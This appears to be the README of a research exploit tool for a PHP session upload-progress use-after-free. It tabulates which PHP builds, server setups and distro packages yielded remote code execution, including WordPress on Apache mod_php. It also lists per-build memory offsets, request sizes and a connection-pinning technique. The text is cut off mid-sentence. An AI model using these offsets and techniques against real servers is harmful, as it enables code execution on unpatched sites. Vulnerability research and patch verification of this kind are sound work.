# php2slop

Research exploit tooling for the PHP `session.upload_progress` use-after-free
(CVE-2026-109618 / CVE-2026-109619).

**Status: WIP research code.** This is not a universal exploit. Most chains
were measured under lab conditions and required specific build offsets, pool
shapes and, in some lanes, non-default configuration. One exception is the
audited WordPress 7.1.3 + Apache prefork mod_php 8.4.24 cell below (all default
Apache/PHP config, official core file, target-written proofs); it is scoped to
direct mod_php and remains stochastic. Treat every result as build- and
configuration-specific until reproduced on your own target.

This repository contains only the exploitation tool, its per-build offset
profiles, and this documentation.

## Status: what works / what does not

RCE: the per-build 8.4.1–8.4.26 mod_php chain (8.4.0/8.4.9 were never
released), the per-build 8.2.34 and 8.3.35 mod_php chain, the audited WordPress
7.1.3 docroot (core silence file) + Debian 13.7 Apache 2.4.69 prefork mod_php
8.4.24 cell under all default config (direct mod_php only; pure-HTTP 149
half-open pin; stochastic rate caveat below), Ubuntu 25.04 8.4.5-1ubuntu1.2, and
the CVE-2026-115560 gadget chain on 8.4.26/8.5.11 (requires `cleanup=0`). The
8.5.11 FPM result requires `pm=static` with a single worker and is conditional
on the row's configuration. No all-version claim.

The distro-package and real-app rows below are otherwise negative: no
full-chain RCE, OOB write, or proof; where a primitive fires it is crash/DoS
only, and the 26.04 release B1 leak is heap-only with no `libphp`/`S` anchor.
The exception among those rows is the WordPress/Apache cell below, which is a
direct mod_php RCE and does not extend to nginx/FPM or other SAPIs. The
Amazon/Fedora/Alma additions do not change the negative picture: Amazon 8.4.26
is A1/S1-only with no B1 leak, Fedora is fixed and FPM-only, and Alma is
vendor-patched and FPM-only. Arch remains metadata-only and not
package-tested. No crash, OOM or HTTP 500 is counted as RCE. Distro negatives
remain conditioned on the tested geometry; see the 7.4/8.0 multipart cap and
FPM `post_max_size` caveat below.

OpenLiteSpeed 1.9.3 + lsphp is a separate SAPI lane and does not change the
lab RCE list: on the locally built 8.4.26 LSAPI binary the 109618 carrier
reaches the poisoned `$_FILES` bucket, but `lsapi_module_main()` skips
`php_request_shutdown()`, so the worker exits 255 (a normal LSAPI failure, not
a signal) and OLS respawns it; packaged 8.4.27 is 11/11 clean. LSAPI is
standalone (no `libphp*.so`, no mod_php), so the 8.4 mod_php chain does not
apply, and 8.5.11 remains a gap rather than a negative. No RCE.

Legend: ✅ RCE in that exact cell · ❌ tested negative in that exact cell ·
🚫 patched build (basis stated) · — no qualifying RCE / untested (coverage gaps only).

### mod_php

Stock `php:<v>-apache` images, `php.ini-production`, **22-byte lab endpoint** for engine-level rows unless the row names the 28-byte stock silence file; **28-byte stock silence file** for the WordPress-docroot rows (8.1.34/8.2.34/8.3.35/8.4.1–8.4.8/8.4.10–8.4.26), ASLR on,
exact per-build offsets.

| PHP build | Branch | Status | Result / qualifier |
|---|---|---|---|
| 5.6.40 | 5.6 | ❌ | no RCE; last 5.6 |
| 7.0.33 | 7.0 | ❌ | no RCE; last 7.0 |
| 7.1.33 | 7.1 | ❌ | no RCE; last 7.1 |
| 7.2.0 | 7.2 | ❌ | no RCE; early 7.2 |
| 7.2.34 | 7.2 | ❌ | no RCE; last 7.2 |
| 7.3.33 | 7.3 | ❌ | no RCE; last 7.3 |
| 7.4.0 | 7.4 | ❌ | no RCE; early 7.4 |
| 7.4.33 | 7.4 | ❌ | no RCE; last 7.4; structural negative, DoS only |
| 8.0.30 | 8.0 | ❌ | no RCE; last 8.0; structural negative, DoS only |
| 8.1.33 | 8.1 | ❌ | no RCE; pre-8.1.34 |
| 8.1.34 | 8.1 | ❌ | no RCE; last tested 8.1 mod_php; forged id accepted, B1 SIGSEGV in _efree before the response; no cookie/leak |
| 8.2.0 | 8.2 | ❌ | no RCE; early 8.2 |
| 8.2.15 | 8.2 | ❌ | no RCE; mid 8.2 |
| 8.2.34 | 8.2 | ✅ | full chain 3/3 (R1 fresh fork, R2 kill/respawn, R3 natural-kill retry); target-written `uid=33(www-data)`; 819,208 B B1 leak 4/4; 149 half-open 1 MiB trickle pin; cold-child precondition removed; last vulnerable 8.2; engine-level |
| 8.2.35 | 8.2 | 🚫 | fixed control; runtime (A1 200, no OOM; 4/4 bodies) |
| 8.3.0 | 8.3 | ❌ | no RCE; early 8.3 |
| 8.3.10 | 8.3 | ❌ | no RCE; mid 8.3 |
| 8.3.20 | 8.3 | ❌ | no RCE; mid 8.3 |
| 8.3.35 | 8.3 | ✅ | full chain 2/2 blind + 3/3 R1/R2/R3; target-written `uid=33(www-data)`; 819,208 B B1 leak 7/7; 149 half-open 1 MiB trickle pin; cold-child precondition removed; last vulnerable 8.3; engine-level |
| 8.3.36 | 8.3 | 🚫 | fixed control; runtime (A1 200, no OOM; 4/4 bodies) |
| 8.4.0 | 8.4 | — | never released upstream; no official image or release; abandoned pre-publication tarball only |
| 8.4.1–8.4.7 | 8.4 | ✅ | per-build tested; 7/7 RCE; official 28-byte WordPress core file, target-written `uid=33(www-data)`; `S=main+0xED398`; 8.4.7 pure-HTTP 149 half-open pin 2/2 (no `%P`, no local process control, no fresh-child swap); 8.4.7 decoded leak 2,097,160 B; engine-level |
| 8.4.8 | 8.4 | ✅ | 2/2 pure-HTTP + 2/2 direct Apache; official 28-byte WordPress core file, target-written `uid=33(www-data)`; `S=main+0xE8398`; decoded leak 819,208 B; B1 request 33,128,677 B; engine-level |
| 8.4.9 | 8.4 | — | never released upstream; no official image or release; 8.4.8 → 8.4.10 |
| 8.4.10–8.4.26 | 8.4 | ✅ | per-build tested, not a single-build extrapolation; 17/17 RCE; official 28-byte WordPress core file; distinct target-written `uid=33(www-data)` proofs; `S=main+0xF8398`; 8.4.26 also pure-HTTP 149 half-open pin (no `%P`/`/proc`/gdb/local process control); exact per-build offsets; handler-independent |
| 8.4.27 | 8.4 | 🚫 | fixed in source; runtime control (A1 200, B1 no leak) |
| 8.5.0 | 8.5 | ❌ | leak only; no libphp code pointer |
| 8.5.5 | 8.5 | ❌ | leak only |
| 8.5.11 | 8.5 | ❌ | leak only; 53 free-slot qwords, 0 `zval_ptr_dtor`, no `libphp`/`main` pointer, no 87-bucket |
| 8.5.12 | 8.5 | 🚫 | fixed in source; runtime (A1 200, normal cookie) |

8.1.34 row: forced single-worker prefork (`MaxRequestWorkers 1`); POST `/wp-content/index.php` (28-byte official silence file, MD5 `67442c5615eba73d105c0715c6620850`); `php.ini-production`; multi-worker not audited. 8.2.34/8.3.35 rows: stock prefork 5/150 and `php.ini-production`; the 149 half-open 1 MiB trickle pin isolates a cold child without `%P`, a restart or a config change; endpoints are the 22-byte probe and the 28-byte core file; engine-level, WordPress not bootstrapped.

Measured `S` anchors are build-specific: 8.4.1–8.4.7 `main+0xED398`; 8.4.8 `main+0xE8398`; 8.4.10–8.4.26 `main+0xF8398`. 8.4.26 `zif_system=lib+0x465370`, `zval_ptr_dtor=lib+0x65EB60`. Do not transplant: Debian 8.4.24 and Ubuntu 8.4.5 use `main+0xF7398`. The 149 half-open pin is HTTP-only but assumes the stock `MaxRequestWorkers=150` and exactly one free child; it is a pool-exhaustion primitive, not a blind unconstrained-pool exploit. 8.4.26 was also re-run unchanged on the official WordPress core file (2/2) and on a plain PHP file under the stock docroot (2/2), both target-written.

### FPM

Stock `php:<v>-fpm` images fronted by nginx; stock production INI,
`pm=dynamic`, `max_children=5`; stock 1 MiB nginx body cap unless noted.

| PHP build | Branch | Status | Result / qualifier | Basis |
|---|---|---|---|---|
| 5.6.40 | 5.6 | ❌ | A2 OOM/SIGSEGV; no B1; no B2 | runtime |
| 7.0.33 | 7.0 | ❌ | B1 leak only | runtime |
| 7.1.33 | 7.1 | ❌ | B1 leak only | runtime |
| 7.2.34 | 7.2 | ❌ | B1 leak only | runtime |
| 7.3.33 | 7.3 | ❌ | B1 leak only | runtime |
| 7.4.33 | 7.4 | ❌ | B1 leak only | runtime |
| 8.0.30 | 8.0 | ❌ | A2 200 under 128M; A1 64M 200, no OOM | runtime |
| 8.1.34 | 8.1 | ❌ | A2 502/exit 70; no state carry-over | runtime |
| 8.2.34 | 8.2 | ❌ | A2 502/exit 70; no chain; the mod_php result does not extend to FPM | runtime |
| 8.2.35 | 8.2 | 🚫 | fixed control; Debian package runtime (A1/A2 200, 0 exit-70) | runtime (distro) |
| 8.3.35 | 8.3 | ❌ | structurally blocked, direct FPM and stock nginx: 8/8 startup-OOM A1/A1-shrink/A2 requests kill the worker (exit 70) before B1; no stale `PS(id)` survivor; B1-min on the replacement child gives a normal 44-byte `PHPSESSID` and no leak; the 4-holder FPM pin cannot survive its own fatal; nginx canonical A1/B1 413, A1-shrink 502 `upstream sent unexpected FastCGI record: 3` (FCGI_STDERR, not buffering), 4 KiB `fastcgi_buffer_size` rejects a 5,000-byte header/~1.17 MB `Set-Cookie`, `post_max_size=8M` discards B1 with `CONTENT_LENGTH`; no chunked escape on FastCGI; `S_off` not calibrated; 8.3.36 control 200/0 fatals; no `/tmp/p1`, no `id`, no RCE | runtime |
| 8.3.36 | 8.3 | 🚫 | fixed control; A2 200, `PEAK=46137344` | runtime |
| 8.4.26 | 8.4 | ❌ | chain negative: sub-1 MiB A1 (993,911 B) still OOM 4,096 B, worker exit 70/502; B1 413 at stock 1 MiB; no surviving child/leak; 109618 primitive; no controlled destructor | runtime |
| 8.4.27 | 8.4 | 🚫 | upstream fix; FPM runtime control not run (G22) | upstream fix |
| 8.5.11 | 8.5 | ✅ | lab: plain full-extension build, `pm=static`, `max_children=1`, same-worker known target + trigger script; blind leak-derived `C`/`PIE`; fake dtor → `zif_system`; 3/3 | runtime |
| 8.5.11 | 8.5 | ❌ | stock `pm=dynamic` pool: leak only | runtime |
| 8.5.12 | 8.5 | 🚫 | fixed; plain full-extension build + stock nginx | runtime |

FPM `5.6.40` produced no B1 leak; the B1-only range is `7.0.33–7.4.33`.
Any 7.4/8.0 FPM B1 negative obtained with the 33 MB B1 body is invalid: stock
`post_max_size=8M` rejects it before session code (see the distro caveat below).

**8.3.35 FPM is structurally blocked (2026-10-24).** Direct FastCGI and stock
nginx both fail. Canonical A1 1,060,869 B, A1 shrink 1,044,741 B and A2 279,369 B
each produce a startup OOM (4,096 / 12,288 / 20,480 B) and the worker exits 70;
8/8 such requests killed the worker, so no process survived to serve B1 with a
stale `PS(id)`. The 4 half-open FastCGI holders leave one of five slots; A1
landed on a new fork (child 38) that died, and B1-min on replacement child 39
returned a normal 44-byte `PHPSESSID` with no leak pointers. The Apache prefork
149-holder FIFO pin is structurally inapplicable: the state holder would have to
survive its own fatal. Stock nginx rejects canonical A1/B1 with 413; A1 shrink
passes 1 MiB but returns 502 `upstream sent unexpected FastCGI record: 3`
(FCGI_STDERR from the dying worker, not a buffering artifact); the default 4 KiB
`fastcgi_buffer_size` rejects a 5,000-byte header and the ~1.17 MB `Set-Cookie`;
`post_max_size=8M` discards B1 with `CONTENT_LENGTH` (warning, 200, no cookie),
and FastCGI has no chunked escape. `php:8.3.36-fpm` control: same A1/A1-shrink/A2
200, zero fatals/exit-70; nginx A1-shrink 200. `S_off` is not calibrated on FPM,
so no B2 geometry was fabricated. No `/tmp/p1`, no `id` output, no RCE; only
PHP-internal upload-progress/temp artifacts.

### nginx + mod_php

nginx terminates HTTP and proxies to Apache prefork + mod_php.

| Build / package | Status | Conditions / result |
|---|---|---|
| 8.4.7 official | ❌ | stock nginx 1 MiB: A1 1,123,451 B / B1 31,035,467 B → 413; `proxy_request_buffering on` destroys the 149-holder pin (measured on the same 8.4.8 stack); direct Apache chain 2/2; direct over-limit B1 control not run |
| 8.4.8 official | ❌ | stock nginx 1 MiB: A1 1,060,211 B / B1 33,128,677 B → 413; holders `up="-"` and Apache sees 6 POSTs; default 4k/8k `proxy_buffer_size` 502 on the 1,686,023 B response header; size-cap-only control 200/181 with no `Set-Cookie`; direct Apache chain 2/2 |
| 8.4.24 Debian 13 (`8.4.24-1~deb13u1`) | — | stock nginx 1 MiB not a positive: the 33,128,677 B B1 would be 413 and buffering re-arms `post_max_size=8M`; the prior non-stock 64 MiB cell (64M body, `post_max_size=64M`, 4 MiB buffers, keepalive) is historical and not a stock result; the verified path is direct Apache (pure-HTTP pin) |
| 8.4.26 official | ❌ | stock nginx 1 MiB negative: A1 1,060,211 B → 413 (`1048576+11635`); B1 33,128,677 B → 413; 298/298 holders `up="-"`; pin-free 8/8 distinct PIDs; B1 header 1,662,850 B vs 8 KiB `proxy_buffer_size` → 502; no stock bypass (note below) |
| 8.4.26 official | — | historical non-stock only: 64 MiB body + 4 MiB buffers + keepalive; not a stock nginx result and not a bypass of the measured stock blockers |
| 8.4.27 | 🚫 | fixed; A1/B1 6×200, 0 leak, 0 OOB (stock and non-stock) |

8.4.7/8.4.8 direct Apache cells remain positive (RCE); the ❌ rows are the nginx-terminated cells only. The measured stock-nginx blockers are the 1 MiB body cap, `proxy_request_buffering on`/buffering (which re-frames chunked bodies and re-arms `post_max_size=8M`) and the default response-header buffer; the 8.4.8 size-cap-only control still returns 200/181 with no `Set-Cookie`, and the 8.4.7 over-limit B1 control was not run. The endpoint is not the blocker: the direct chain uses the official WordPress silence file. The Debian 8.4.24 row is `—` for stock nginx: only the direct Apache pure-HTTP pin is verified, and the prior non-stock 64 MiB nginx cell is historical, not a stock result.

**Stock nginx 8.4.26 single-request/pin bypass — negative (2026-10-24).**
With stock `proxy_request_buffering on`, 298/298 half-open holders were logged
`400` with `up="-"`; zero holder requests reached Apache, and the six probes ran
on six distinct PIDs. Direct control: 6/6 probes on one child (pid 457).
Pin-free is not an alternative: 8 sequential requests gave 8 distinct PIDs in
all four shapes (stock new connections, client keep-alive, pipelining, direct),
and the pin-free chain leaked 0 B (A1 pid 139 → B1 pid 184; 2/2). A1 is
1,060,211 B → 413 (`1048576+11635`); a 14-variant under-cap sweep found no
functional A1 (the largest under-cap variants that still OOM at 12288 leak
nothing through B1). B1's response header is 1,662,850 B (`Set-Cookie` alone
1,662,634 B) vs the default `proxy_buffer_size` 8 KiB → 502 `upstream sent too
big header`, even with same-child proven under non-stock C2 (A1/B1 both pid
327). With only the cap lifted, `proxy_http_version 1.0` plus buffering
re-frames B1 as `Content-Length` (`reqlen=33133400` → `200/182`, no cookie),
re-arming `post_max_size`.

The only measured same-child route without holders is C4: non-stock
request-side relaxation with `proxy_http_version 1.1`,
`proxy_set_header Connection ""`, and an upstream keepalive pool (8/8 requests
on one client connection → all pid 244); a residual paginated sub-8 KiB leak is
not tested, would still need a non-stock same-child mechanism, and is not a
stock claim. The chain itself is sound on the same container: direct + pin A1
OOM 4096, B1 decoded 819,208 B, 1,095 `zval_ptr_dtor` hits, A2 OOM 20480, B2
`0/0`, target-written `uid=33(www-data)` + `PC26` (59 B), child SIGSEGV. The
direct Apache 8.4.26 ✅ is preserved; stock nginx remains ❌, and the historical
non-stock 64 MiB/4 MiB buffer/keepalive cell is not a stock result or bypass
claim.

### nginx + FPM

Stock nginx front, stock FPM pool.

| PHP build | Status | Conditions / result |
|---|---|---|
| 8.0.30 | ❌ | A2 200; A1 64M 200, no OOM |
| 8.1.34 | ❌ | A2 502/exit 70; no state carry-over |
| 8.2.34 | ❌ | same 502/exit-70 shape |
| 8.2.35 | 🚫 | fixed control; 64M diag A1/A2 200, 0 exit-70 |
| 8.3.35 | ❌ | canonical A1/B1 413 at 1 MiB; A1 shrink 502 `upstream sent unexpected FastCGI record: 3` (FCGI_STDERR from dying worker); startup OOM exit 70; 4 KiB `fastcgi_buffer_size` 502 on a 5,000-byte header/~1.17 MB `Set-Cookie`; no chain |
| 8.3.36 | 🚫 | fixed; A2 200 |
| 8.4.26 | ❌ | stock 1m 413; 64M diag 502/OOM (worker exit 70); sub-1 MiB A1 alone kills the worker, so 1 MiB is not the sole blocker; 1 MiB amplification tested and insufficient to replace B1 (real: 68,184 B → 34,216,008 B peak, 501.8×; best 507.2×; note below); no chain |
| 8.4.27 | 🚫 | upstream fix; runtime control missing (G22) |
| 8.5.11 | ❌ | B1 leak only under stock `pm=dynamic`; the single-worker 3/3 result is in the FPM table, not this pool |
| 8.5.12 | 🚫 | plain full-extension build + stock nginx; A1 200 |

**1 MiB amplification is real but cannot replace B1 (2026-10-24).** Stock PHP
8.4.26 (mod_php and FPM) request parsing amplifies a 68,184 B multipart body
(220 zero-length nested file parts, `filename=""`, depth 63) to a 34,216,008 B
`memory_get_peak_usage(false)` peak (501.8×); the best ratio is 507.2×
(31,104 B → 15,777,288 B), and the largest measured peak is 153,134,552 B from
311,016 B (492×; 2G measurement INI), which OOMs at stock `memory_limit=128M`.
`max_file_uploads=20` counts only parts with content; zero-length `filename=""`
parts are exempt, so `max_input_vars` is the only cap. Through stock nginx
1.31.8 (`client_max_body_size 1m`), `a2shape_1000` (309,204 B) reaches PHP and
returns 500 `Allowed memory size ... exhausted` on mod_php and 502 with
`child N exited with code 70` on FPM; A1-shrink (993,911 B) returns 500 on
mod_php and 502/exit 70 on FPM; canonical B1 (33,128,677 B, chunked) is 413
`client intended to send too large chunked body: 1048576+65536`; gzip
`Content-Encoding` is not decompressed; TE+CL is 400; TE:gzip is 501.

It cannot replace B1: B1 needs one POST field value whose `zend_string` is at
`chunk+0x1000` (data at `chunk+0x1018`) in the freed 2 MiB `PS(id)` chunk, with
the forged header at `chunk+0x137000`. The minimum value data is 1,269,768 B and
the canonical fill is 2,092,831 B (`511*4096-25`); the nginx edge caps at
1,048,576 B `Content-Length` / 1,114,112 B chunked: the chunked cap is 155,656 B
below the minimum (the CL cap is 221,192 B below), before multipart framing, and
both are ~1 MB below the canonical fill. Amplification allocates array metadata
(~1.5 KB nodes), not body-value buffers; the inflated session serialization
buffer can only reach the offset with framing/header-derived text (no
NUL/`0x16`), while binary value bytes stay ≤1,114,112 B.
`proxy_request_buffering on` also blocks the 149-holder pin, and
`proxy_buffer_size 4k` would 502 any ~1.67 MB leak cookie. Empirically, A1 +
canonical B1 direct is 3/3 leaks (819,200 B decoded, 1,095 `zval_ptr_dtor`
hits); the amplified body as B1 is 200/195 with no cookie; the amplified OOM as
A1 + canonical B1 is 200/259 with a clean 32-byte session; the wrong-page
`0xF0` 33 MB control corrupts the heap and aborts with no leak. No
target-written `uid` in this run.

### OpenLiteSpeed + lsphp (LSAPI)

OpenLiteSpeed 1.9.3 Open, stock-like config, 22-byte endpoint
(`<?php echo "OK\n"; ?>`), PHP `memory_limit=128M`, `post_max_size=8M`,
`upload_max_filesize=2M`, `output_buffering=4096`. `lsphp` is a standalone
LSAPI executable, not a shared module; there is no Apache `php_module`, and
`lsphp -i` reports `Server API => LiteSpeed V8.3`.

| PHP build | LSAPI | Status | Result / qualifier | Basis |
|---|---|---|---|---|
| 8.4.26 (local source build) | V8.3 | ❌ | 22-byte `/index.php` and `/health.php` return 200 normally; instrumented build reproduces the poisoned `$_FILES` bucket at H=427344 (5,026,036 B; bucket 0 pad bytes, `type_info 0x0106`) then OOM 12,288 B; untouched binary: HTTP 500, `wait4` `WIFEXITED` status 255, no SIGSEGV/SIGABRT/SIGBUS, OLS respawns the worker and health stays 200; H=427620 and 6.5 MB flood also OOM 4,096/exit 255; no RCE | runtime |
| 8.4.27 (`lsphp84 8.4.27-1+trixie`) | V8.3 | 🚫 | fixed control: 11/11 HTTP 200 (carrier H=427344, H=427620, flood, raw/multipart 1/8/16/33 MiB), no request-time worker exits or signals, no OOM | runtime |
| 8.5.11 | V8.3 (upstream) | — | no exact local `lsphp` build; upstream `sapi/litespeed/lsapi_main.c` has the same early return, so the expected shape is the same 500/exit 255, but **not measured**; gap G50, not a negative | source only |

**Why LSAPI does not reach the destructor (2026-10-23).**
`lsapi_module_main()` returns `-1` immediately when `php_request_startup()`
fails; `processReq()` breaks the accept loop, only `php_module_shutdown()`
runs, and `main()` returns `-1` (OS exit status 255). `php_request_shutdown()`
— where `$_FILES` is destroyed — is skipped, so the poisoned bucket is never
destructed through the request path. The 8.4.26 producer therefore ends in
OOM plus worker recycle, not in the mod_php shutdown-time crash chain.

**LSAPI is not mod_php.** `lsphp` is a standalone PIE executable (`ldd`:
`libm`, `libc`, loader only); there is no `libphp*.so` in the rootfs and no
Apache `php_module`. OLS runs `lscgid -> lsphp master -> workers`, so the 8.4
mod_php chain's libphp addresses and handlers do not apply. The engine-level
bug is SAPI-agnostic, but the observable consequence is SAPI-specific.

**Impact.** Exit 255 is a normal LSAPI failure return (`main()` returning
`-1`), not a crash signal; there is no SIGSEGV/SIGABRT/SIGBUS. OLS respawns
the worker and health stays 200. No code-execution indicators were observed;
a crash would still not be RCE.

### Distro packages

Tested or package-evidenced rows only; exact package strings. Untested
metadata-only candidates are listed in the coverage-gap table.

| Distro / release | Exact package | SAPI | Status | Result / qualifier |
|---|---|---|---|---|
| Debian 13 (trixie) | `8.4.24-1~deb13u1` | mod_php | ✅ | **stock package, direct Apache mod_php**: pure-HTTP 149 half-open pin 2/2 full chains (`C1`/`C2`) + 1/1 leak-only (`L1`), target-written `uid=33(www-data)` on B2 attempt 0, no `%P`/`/proc`/gdb/local process control/fresh-child swap, capped-pool `cell.py`/`driver.py` harness gone from the execution path (archived); prior multi-worker audit 6/6 total (2/2 fresh + prior 4/4) with 4 target-written proofs (blind 2/20; pooled 4/40 lab-assisted); full chain on fully stock cell B (no site/conf/INI override), 2 independent proofs; package constants `S=main+0xF7398`, `zif_system=0x24cdd0`, `zval_ptr_dtor=0x424ff0`, `PS(id)=ps_globals+0x10`; package default; warm 25/25; B1 33,128,677 B request / 819,208 B decoded leak; nginx stock 1 MiB blocked (not a positive) |
| Debian 13.7 (trixie) | `8.4.27-1~deb13u1` | mod_php + FPM | 🚫 | explicit changelog fix for CVE-2026-109618/109619; mod_php A1 200, B1 0/5, A2 200; FPM A1 200, 33 MB B1 rejected by stock `post_max_size=8M` (not a valid negative) |
| Debian 12 (bookworm) | `8.2.35-1~deb12u1` | mod_php + FPM | 🚫 | fixed control; A1 200, A2 200, 0 FPM exit-70; package revision includes the 109618/109619 fix |
| Debian 12 (bookworm) | `8.2.32-1~deb12u1` | mod_php + FPM | ❌ | A1 500 parse-OOM, A2 500, 2 FPM exit-70; B1 no leak; crash/DoS only; B1 leak/address recovery blocker |
| Debian 11.11 (bullseye) | `7.4.33-1+deb11u12` | mod_php + FPM | ❌ | **no B1 primitive** (mod_php); no 109618/109619 changelog entry, not claimed fixed; mod_php A1 200, B1 0/5, A2 200; pinned single-child 0/3; FPM A1 200, B1 rejected by stock `post_max_size=8M`; 7.4 1,020-part multipart cap |
| Ubuntu 25.04 (plucky) | `8.4.5-1ubuntu1.2` | mod_php | ✅ | package-specific; 2/2 full-chain RCE on the official WordPress core file; symbol offsets `0x245810`/`0x424fc0`; `fillers=116`; `S=main+0xF7398`; upstream 8.4.5 is in the verified 8.4.1–8.4.7 range |
| Ubuntu 22.04 LTS | `8.1.2-1ubuntu2.28` | mod_php + FPM | 🚫 | fixed control; A1 200 (no cookie), A2 200, 0 FPM exit-70; package revision carries the branch fix |
| Ubuntu 22.04 LTS | `8.1.2-1ubuntu2` | mod_php + FPM | ❌ | A1 500 parse-OOM, A2 500, 2 FPM exit-70; B1 no leak; crash/DoS only; B1 leak/address recovery blocker |
| Ubuntu 24.04 LTS | `8.3.6-0maysync1` (release `8.3.6`, pre-update) | mod_php + FPM | ❌ | 109618 CL body: mod_php SIGSEGV 4/4 (OOM 12,288 B); Apache+FPM HTTP 200 empty, OOM 12,288 B, child exit 70, no SIGSEGV, next GET 200; CL A1 OOM 4,096 logged; nginx 64 MiB A1 child exit 70/request; no RCE/OOB/proof; crash/DoS only |
| Ubuntu 24.04 LTS | `8.3.6-0ubuntu0.24.04.13` | mod_php + FPM | 🚫 | fixed control; mod_php 14,497,878 B chunked body -> 200 `OK`, PHP warning `Actual POST length does not match Content-Length, and exceeds 8388608 bytes`, no OOM; A1 200, 0 FPM exit-70; fixed mod_php A2/B2 not run |
| Ubuntu 26.04 LTS | `8.5.4-0ubuntu1` (release) | mod_php + FPM | ❌ | 109618 CL body: mod_php SIGSEGV 4/4 (OOM 12,288 B); Apache+FPM HTTP 200 empty, OOM 12,288 B, child exit 70, no SIGSEGV, next GET 200; CL A1 OOM 4,096 logged; nginx 64 MiB A1 child exit 70/request; B1 819,208 B heap leak 1/8, no libphp/S anchor; no ASLR break; no RCE/OOB/proof; crash/DoS only |
| Ubuntu 26.04 LTS | `8.5.4-0ubuntu1.5` | mod_php + FPM | 🚫 | fixed control; mod_php 14,497,878 B chunked body -> 200 `OK`, PHP warning `Actual POST length does not match Content-Length, and exceeds 8388608 bytes`, no OOM; A1 200, 0 FPM exit-70 |
| Alpine 3.20.10 | `8.3.15-r0` | mod_php (apache2) | ❌ | crash-only; A1 200; `--parts 1000` 500 OOM (pinned single child); B1 0/3, 34-byte cookies; A2 500 OOM; 8.3 parse-phase OOM only |
| Alpine 3.21.9 | `8.4.27-r0` | mod_php (apache2) | 🚫 | fixed by version; A1 200, B1 0/3, A2 200 |
| Arch Linux rolling | `8.5.12-1`; `php-legacy 8.3.36-1` | mod_php | 🚫 | fixed metadata only: repos ship 8.5.12/8.3.36 and no 8.4.26; no local image/rootfs, so **not package-tested**; no Arch package chain |
| `php:8.4.26-apache` + Arch INI (not a package) | Arch `php.ini` on official `8.4.26-apache` | mod_php | ✅ | **INI-compatibility test, not an Arch package result and not an Arch RCE**; upstream 8.4.26 chain with Arch-shipped INI; already counted in the mod_php table above |
| Rocky Linux 9.3 | `8.0.30-8.el9_8.1` | FPM only | ❌ | no mod_php; B1 not valid (33 MB rejected by stock `post_max_size=8M`); A1/A2 200; 1,020-part multipart cap |
| AlmaLinux 9.8 | `php-fpm 8.0.30-8.el9_8.1` | FPM only | 🚫 | same NEVRA and byte-identical `php.ini` as Rocky 9; no mod_php/`libphp`; A1/A2 200; B1 blocked by stock 8M (invalid negative); 109618 header-flood does not grow Zend heap under FPM (peak 2–6 MB at 700k headers), so S1 unreachable at stock limits; `rpm -q --changelog` names CVE-2026-109618/109619 (Red Hat backport, "Avoid state corruption via bailout") |
| Amazon Linux 2023.12 | `php8.4-modphp 8.4.26-1.amzn2023.0.1` | mod_php + FPM | ❌ | pre-fix row; 8.4.26 installable only when `modphp`+`fpm`+`common` are pinned (current `fpm` pulls `common` 8.4.27 and upgrades modphp); stock SAPI is FPM (MPM `event`; `libphp.so` loads only under prefork), mod_php measured with declared prefork fixture; A1 OOM reproduced at shifted geometry, onset between 860 and 870 big-value parts (`a1_p880` 1,068,191 B: 500, OOM 20,480 B); B1 0/5 stock and 0/5 pinned single-child prefork (34-B normal cookies); 109618 S1 at H=427343 (500, OOM 12,288 B), S2 not observed over 38 H points (33 below S1 threshold); FPM A2 OOM 20,480 B; no B1 leak, no B2, no RCE |
| Amazon Linux 2023.12 | `php8.4-modphp 8.4.27-1.amzn2023.0.1` | mod_php + FPM | 🚫 | fixed control on same package line/INI; A1 `a1_p880` 200; 109618 H=427343 and H=440000 200 (175 B), no OOM; FPM A2 200; behaviorally fixed, Amazon changelog is version-only and does not name the CVEs |
| Fedora 44 | `php-fpm 8.5.12-1.fc44` | FPM only | 🚫 | no mod_php package or Apache DSO (`php-embedded` `libphp.so` has no `apache2handler`); A1 200 (40-B cookie), A2 200; B1 33 MB blocked by stock `post_max_size=8M`, so invalid negative; 8.5.12 fixed by version; 109618 not run |

**Amazon Linux 2023.12 (2026-10-23).** `php8.4-modphp 8.4.26-1.amzn2023.0.1`
is still installable, but only as a matched set: installing the current
`php8.4-fpm 8.4.27` pulls `php8.4-common 8.4.27` and upgrades a pinned
`php8.4-modphp 8.4.26` back to 8.4.27, so `modphp`, `fpm` and `common` must be
pinned together. Amazon's stock deployment is FPM: `httpd` runs MPM `event`,
`20-php.conf` loads `libphp.so` only inside `<IfModule prefork.c>`, and
`conf.d/php.conf` proxies `.php` to `/run/php-fpm/www.sock`. The mod_php rows
therefore used an explicit prefork switch (declared fixture, no PHP INI
change). On mod_php 8.4.26, A1 OOM is reproduced at a shifted geometry: the
reference 974-part body with 860 big-value parts returns 200, the onset is
between 860 and 870 big-value parts, and `a1_p880` (1,068,191 B) returns 500
with `Allowed memory size of 134217728 bytes exhausted (tried to allocate
20480 bytes)`. B1 is 0/5 on the stock prefork pool and 0/5 on a pinned
single-child prefork pool; every cookie is the normal 34-byte value (26-char
ID plus `; path=/`). 109618 reaches S1 at H=427343 (500, OOM 12,288 B); S2 was
not observed over 38 H points total, 33 of them below the S1 threshold, with
zero SIGSEGV/AH00052. The 8.4.27 controls are clean: A1 and 109618 (H=427343,
H=440000) return 200, no OOM. FPM 8.4.26 A2 OOMs (20,480 B) and 8.4.27 A2
returns 200. No B1 leak, no B2, no RCE; the OOMs are crash/DoS only.

**Fedora 44 (2026-10-23).** `php-fpm 8.5.12-1.fc44` is FPM-only: there is no
`php*modphp*` package and no Apache DSO (`php-embedded`'s `libphp.so` lacks
`apache2handler`). A1 returns 200 (40-byte cookie) and A2 returns 200; B1 is
blocked by stock `post_max_size=8M` before session code, so the 33 MB body is
an invalid negative. 8.5.12 is fixed by version; the 109618 producer was not
run on this fixed build.

**AlmaLinux 9.8 (2026-10-23).** `php-fpm 8.0.30-8.el9_8.1` carries the same
NEVRA and a byte-identical `php.ini` (`792ce93a…dc4f8c`) as Rocky 9. It is
FPM-only (no mod_php/`libphp`); A1/A2 return 200, B1 is blocked by the same
stock 8M gate, and the 109618 header-flood does not grow the Zend heap under
FPM (peak 2–6 MB at 700k headers), so S1 is unreachable at stock limits.
`rpm -q --changelog` on Alma 9.8 and Rocky 9 names CVE-2026-109618 and
CVE-2026-109619 ("Avoid state corruption via bailout"), so the EL9 package is
patched by the Red Hat backport. No RCE or OOB write.

**Arch Linux (2026-10-23).** No local image or rootfs was available, so no
native package test was performed; current repositories ship only fixed
`8.5.12`/`8.3.36` and no 8.4.26 package. The earlier full-chain result mounted
the Arch-shipped `php.ini` on the official `php:8.4.26-apache` image; that is
